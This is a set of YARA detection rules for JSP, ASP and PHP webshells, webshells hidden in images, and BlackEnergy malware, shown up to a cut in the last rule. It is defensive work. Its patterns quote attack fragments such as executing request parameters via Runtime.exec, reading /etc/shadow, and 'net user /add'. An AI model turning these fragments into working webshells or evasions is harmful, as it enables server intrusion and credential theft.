rule SSC_Swebshell_jsp_generic_processbuilder
{
meta:
description = "Generic JSP webshell which uses processbuilder to execute user input"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "82198670ac2072cd5c2853d59dcd0f8dfcc28923"
hash = "c05a520d96e4ebf9eb5c73fc0fa446ceb5caf343"
strings:
$exec = "ProcessBuilder" fullword wide ascii
$start = "start" fullword wide ascii
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
condition:
filesize < 2000 and (
any of ( $input* ) and
any of ( $req* )
)
and $exec and $start
}
rule SSC_Swebshell_jsp_generic_reflection
{
meta:
description = "Generic JSP webshell which uses reflection to execute user input"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "62e6c6065b5ca45819c1fc049518c81d7d165744"
strings:
$ws_exec = "invoke" fullword wide ascii
$ws_class = "Class" fullword wide ascii
$fp = "SOAPConnection"
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
condition:
filesize < 10KB and all of ( $ws_* ) and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and (
any of ( $input* ) and
any of ( $req* )
)
and not $fp
}
rule SSC_Swebshell_jsp_generic_classloader
{
meta:
description = "Generic JSP webshell which uses classloader to execute user input"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "6b546e78cc7821b63192bb8e087c133e8702a377d17baaeb64b13f0dd61e2347"
date = "2021/01/07"
strings:
$exec = "extends ClassLoader" wide ascii
$class = "defineClass" fullword wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
condition:
filesize < 10KB and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and (
any of ( $input* ) and
any of ( $req* )
)
and $exec and $class
}
rule SSC_Swebshell_jsp_generic_encoded_shell
{
meta:
description = "Generic JSP webshell which contains cmd or /bin/bash encoded in ascii ord"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "3eecc354390d60878afaa67a20b0802ce5805f3a9bb34e74dd8c363e3ca0ea5c"
strings:
$sj0 = /{ ?47, 98, 105, 110, 47, 98, 97, 115, 104/ wide ascii
$sj1 = /{ ?99, 109, 100}/ wide ascii
$sj2 = /{ ?99, 109, 100, 46, 101, 120, 101/ wide ascii
$sj3 = /{ ?47, 98, 105, 110, 47, 98, 97/ wide ascii
$sj4 = /{ ?106, 97, 118, 97, 46, 108, 97, 110/ wide ascii
$sj5 = /{ ?101, 120, 101, 99 }/ wide ascii
$sj6 = /{ ?103, 101, 116, 82, 117, 110/ wide ascii
condition:
filesize <300KB and any of ($sj*)
}
rule SSC_Swebshell_jsp_netspy
{
meta:
description = "JSP netspy webshell"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/24"
hash = "94d1aaabde8ff9b4b8f394dc68caebf981c86587"
hash = "3870b31f26975a7cb424eab6521fc9bffc2af580"
strings:
$scan1 = "scan" nocase wide ascii
$scan2 = "port" nocase wide ascii
$scan3 = "web" fullword nocase wide ascii
$scan4 = "proxy" fullword nocase wide ascii
$scan5 = "http" fullword nocase wide ascii
$scan6 = "https" fullword nocase wide ascii
$write1 = "os.write" fullword wide ascii
$write2 = "FileOutputStream" fullword wide ascii
$write3 = "PrintWriter" fullword wide ascii
$http = "java.net.HttpURLConnection" fullword wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
condition:
filesize < 30KB and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and (
any of ( $input* ) and
any of ( $req* )
)
and 4 of ( $scan* ) and 1 of ( $write* ) and $http
}
rule SSC_Swebshell_jsp_by_string
{
meta:
description = "JSP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/09"
hash = "e9060aa2caf96be49e3b6f490d08b8a996c4b084"
hash = "4c2464503237beba54f66f4a099e7e75028707aa"
hash = "06b42d4707e7326aff402ecbb585884863c6351a"
strings:
$jstring1 = "<title>Boot Shell</title>" wide ascii
$jstring2 = "String oraPWD=\"" wide ascii
$jstring3 = "Owned by Chinese Hackers!" wide ascii
$jstring4 = "AntSword JSP" wide ascii
$jstring5 = "JSP Webshell</" wide ascii
$jstring6 = "motoME722remind2012" wide ascii
$jstring7 = "EC(getFromBase64(toStringHex(request.getParameter(\"password" wide ascii
$jstring8 = "http://jmmm.com/web/index.jsp" wide ascii
$jstring9 = "list.jsp = Directory & File View" wide ascii
$jstring10 = "jdbcRowSet.setDataSourceName(request.getParameter(" wide ascii
$jstring11 = "Mr.Un1k0d3r RingZer0 Team" wide ascii
$jstring12 = "MiniWebCmdShell" fullword wide ascii
$jstring13 = "pwnshell.jsp" fullword wide ascii
$jstring14 = "session set &lt;key&gt; &lt;value&gt; [class]<br>"  wide ascii
$jstring15 = "Runtime.getRuntime().exec(request.getParameter(" nocase wide ascii
$jstring16 = "GIF98a<%@page" wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_bin_files
$dex   = { 64 65 ( 78 | 79 ) 0a 30 }
$pack  = { 50 41 43 4b 00 00 00 02 00 }
condition:
filesize < 100KB and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and not (
uint16(0) == 0x5a4d or
$dex at 0 or
$pack at 0 or
// fp on jar with zero compression
uint16(0) == 0x4b50
)
and any of ( $jstring* )
}
rule SSC_Swebshell_jsp_input_upload_write
{
meta:
description = "JSP uploader which gets input, writes files and contains \"upload\""
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/24"
hash = "ef98ca135dfb9dcdd2f730b18e883adf50c4ab82"
hash = "583231786bc1d0ecca7d8d2b083804736a3f0a32"
hash = "19eca79163259d80375ebebbc440b9545163e6a3"
strings:
$upload = "upload" nocase wide ascii
$write1 = "os.write" fullword wide ascii
$write2 = "FileOutputStream" fullword wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
condition:
filesize < 10KB and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and (
any of ( $input* ) and
any of ( $req* )
)
and $upload and 1 of ( $write* )
}
rule SSC_SWEBSHELL_generic_os_strings : FILE {
meta:
description = "typical webshell strings"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/12"
modified = "2022-09-27"
score = 50
strings:
$fp1 = "http://evil.com/" wide ascii
$fp2 = "denormalize('/etc/shadow" wide ascii
$fp3 = "vim.org>"
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_os_strings
// windows = nocase
$w1 = "net localgroup administrators" nocase wide ascii
$w2 = "net user" nocase wide ascii
$w3 = "/add" nocase wide ascii
// linux stuff, case sensitive:
$l1 = "/etc/shadow" wide ascii
$l2 = "/etc/ssh/sshd_config" wide ascii
$take_two1 = "net user" nocase wide ascii
$take_two2 = "/add" nocase wide ascii
condition:
filesize < 70KB and
( (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
or (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
or (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
) and (
filesize < 300KB and
not uint16(0) == 0x5a4d and (
all of ( $w* ) or
all of ( $l* ) or
2 of ( $take_two* )
)
)
and not any of ( $fp* )
}
rule SSC_Swebshell_in_image
{
meta:
description = "Webshell in GIF, PNG or JPG"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "d4fde4e691db3e70a6320e78657480e563a9f87935af873a99db72d6a9a83c78"
date = "2021/02/27"
modified = "2023-01-06"
score = 55
strings:
$png = { 89 50 4E 47 }
$jpg = { FF D8 FF E0 }
$gif = { 47 49 46 38 }
$gif2 = "gif89"
// MS access
$mdb = { 00 01 00 00 53 74 }
//$mdb = { 00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74 20 44 42 }
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_php_payload
// \([^)] to avoid matching on e.g. eval() in comments
$cpayload1 = /\beval[\t ]*\([^)]/ nocase wide ascii
$cpayload2 = /\bexec[\t ]*\([^)]/ nocase wide ascii
$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase wide ascii
$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase wide ascii
$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase wide ascii
$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase wide ascii
$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase wide ascii
$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase wide ascii
$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase wide ascii
$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase wide ascii
$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
// TODO backticks
//strings from private rule capa_php_write_file
$php_multi_write1 = "fopen(" wide ascii
$php_multi_write2 = "fwrite(" wide ascii
$php_write1 = "move_uploaded_file" fullword wide ascii
//strings from private rule capa_jsp
$cjsp1 = "<%" ascii wide
$cjsp2 = "<jsp:" ascii wide
$cjsp3 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp4 = "/jstl/core" ascii wide
//strings from private rule capa_jsp_payload
$payload1 = "ProcessBuilder" fullword ascii wide
$payload2 = "processCmd" fullword ascii wide
// Runtime.getRuntime().exec(
$rt_payload1 = "Runtime" fullword ascii wide
$rt_payload2 = "getRuntime" fullword ascii wide
$rt_payload3 = "exec" fullword ascii wide
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_payload
$asp_payload0  = "eval_r" fullword nocase wide ascii
$asp_payload1  = /\beval\s/ nocase wide ascii
$asp_payload2  = /\beval\(/ nocase wide ascii
$asp_payload3  = /\beval\"\"/ nocase wide ascii
// var Fla = {'E':eval};  Fla.E(code)
$asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
$asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
$asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
$asp_multi_payload_one2 = "addcode" fullword wide ascii
$asp_multi_payload_one3 = /\.run\b/ wide ascii
$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
$asp_multi_payload_three2 = "Process" fullword wide ascii
$asp_multi_payload_three3 = ".Start" wide ascii
// this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
// execute cmd.exe /c with arguments using ProcessStartInfo
$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
$asp_multi_payload_five2 = ".Start" nocase wide ascii
$asp_multi_payload_five3 = ".Filename" nocase wide ascii
$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
//strings from private rule capa_asp_write_file
// $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
$asp_always_write1 = /\.write/ nocase wide ascii
$asp_always_write2 = /\.swrite/ nocase wide ascii
//$asp_write_way_one1 = /\.open\b/ nocase wide ascii
$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
$asp_cr_write1 = "CreateObject(" nocase wide ascii
$asp_cr_write2 = "CreateObject (" nocase wide ascii
$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
$asp_streamwriter2 = "filestream" fullword nocase wide ascii
condition:
( $png at 0 or $jpg at 0 or $gif at 0 or $gif2 at 0 or $mdb at 0 ) and
( ( (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and
( (
any of ( $cpayload* ) or
all of ( $m_cpayload_preg_filter* )
)
or (
any of ( $php_write* ) or
all of ( $php_multi_write* )
)
) ) or
( (
any of ( $cjsp* )
)
and (
1 of ( $payload* ) or
all of ( $rt_payload* )
)
) or
( (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and
( (
any of ( $asp_payload* ) or
all of ( $asp_multi_payload_one* ) or
all of ( $asp_multi_payload_two* ) or
all of ( $asp_multi_payload_three* ) or
all of ( $asp_multi_payload_four* ) or
all of ( $asp_multi_payload_five* )
)
or (
any of ( $asp_always_write* ) and
(
any of ( $asp_write_way_one* ) and
any of ( $asp_cr_write* )
) or (
any of ( $asp_streamwriter* )
)
)
) ) )
}
rule SSC_SWEBSHELL_Mixed_Obfuscations {
meta:
description = "Detects webshell with mixed obfuscation commands"
author = "Arnim Rupp"
reference = "https://github.com/Neo23x0/yarGen"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
date = "2023-01-28"
hash1 = "8c4e5c6bdfcc86fa27bdfb075a7c9a769423ec6d53b73c80cbc71a6f8dd5aace"
hash2 = "78f2086b6308315f5f0795aeaa75544128f14889a794205f5fc97d7ca639335b"
hash3 = "3bca764d44074820618e1c831449168f220121698a7c82e9909f8eab2e297cbd"
hash4 = "b26b5e5cba45482f486ff7c75b54c90b7d1957fd8e272ddb4b2488ec65a2936e"
hash5 = "e217be2c533bfddbbdb6dc6a628e0d8756a217c3ddc083894e07fd3a7408756c"
score = 50
strings:
$s1 = "rawurldecode/*" ascii
$s2 = "preg_replace/*" ascii
$s3 = " __FILE__/*" ascii
$s4 = "strlen/*" ascii
$s5 = "str_repeat/*" ascii
$s6 = "basename/*" ascii
condition:
( uint16(0) == 0x3f3c and filesize < 200KB and ( 4 of them ))
}
rule SSC_SWEBSHELL_Cookie_Post_Obfuscation {
meta:
description = "Detects webshell using cookie POST"
author = "Arnim Rupp"
date = "2023-01-28"
license = "https://github.com/SigmaHQ/Detection-Rule-License/blob/main/LICENSE.Detection.Rules.md"
hash = "d08a00e56feb78b7f6599bad6b9b1d8626ce9a6ea1dfdc038358f4c74e6f65c9"
hash = "2ce5c4d31682a5a59b665905a6f698c280451117e4aa3aee11523472688edb31"
hash = "ff732d91a93dfd1612aed24bbb4d13edb0ab224d874f622943aaeeed4356c662"
hash = "a3b64e9e065602d2863fcab641c75f5d8ec67c8632db0f78ca33ded0f4cea257"
hash = "d41abce305b0dc9bd3a9feb0b6b35e8e39db9e75efb055d0b1205a9f0c89128e"
hash = "333560bdc876fb0186fae97a58c27dd68123be875d510f46098fc5a61615f124"
hash = "2efdb79cdde9396ff3dd567db8876607577718db692adf641f595626ef64d3a4"
hash = "e1bd3be0cf525a0d61bf8c18e3ffaf3330c1c27c861aede486fd0f1b6930f69a"
hash = "f8cdedd21b2cc29497896ec5b6e5863cd67cc1a798d929fd32cdbb654a69168a"
strings:
$s1 = "]($_COOKIE, $_POST) as $"
$s2 = "function"
$s3 = "Array"
condition:
( uint16(0) == 0x3f3c and filesize < 100KB and ( all of them ))
}
rule SSC_SGM_AutoGen_SCBOx
{
strings:
$magic  = { 4D 5A }
$img1 = "rundll32" nocase
$img2 = "RUNDLL32.EXE"
$c1 = ",#"
$c2 = ", #"
$c3 = ".dll #"
$c4 = ".ocx #"
$fp1 = "Msbuild"
$fp2 = "Tools\\MSVC"
$fp3 = "\\Tracker.exe"
$fp4 = "FileTracker32.dll,#1"
$fp5 = "FileTracker32.dll\",#1"
$fp6 = "FileTracker64.dll,#1"
$fp7 = "FileTracker64.dll\",#1"
$fp8 = "EDGEHTML.dll"
$fp9 = "#141"
condition:
not $magic at 0 and not any of ($fp*) and any of ($img*) and any of ($c*) and filesize > 20KB and filesize < 40KB
}
rule SSC_ABlackEnergy
{
strings:
$hc1 = {68 97 04 81 1D 6A 01}
$hc2 = {68 A8 06 B0 3B 6A 02}
$hc3 = {68 14 06 F5 33 6A 01}
$hc4 = {68 AF 02 91 AB 6A 01}
$hc5 = {68 8A 86 39 56 6A 02}
$hc6 = {68 19 2B 90 95 6A 01}
$hc7 = {(68 | B?) 11 05 90 23}
$hc8 = {(68 | B?) EB 05 4A 2F}
$hc9 = {(68 | B?) B7 05 57 2A}
condition:
2 of ($hc*)
}
rule SSC_ABlackEnergy3
{
strings:
$a1 = "MCSF_Config" ascii
$a2 = "NTUSER.LOG" ascii
$a3 = "ldplg" ascii
$a4 = "unlplg" ascii
$a5 = "getp" ascii
$a6 = "getpd" ascii
$a7 = "CSTR" ascii
$a8 = "FONTCACHE.DAT" ascii
condition:
4 of them
}
rule SSC_ABlackEnergy2_Driver
{
strings:
$a1 = {7E 4B 54 1A}
$a2 = {E0 3C 96 A2}
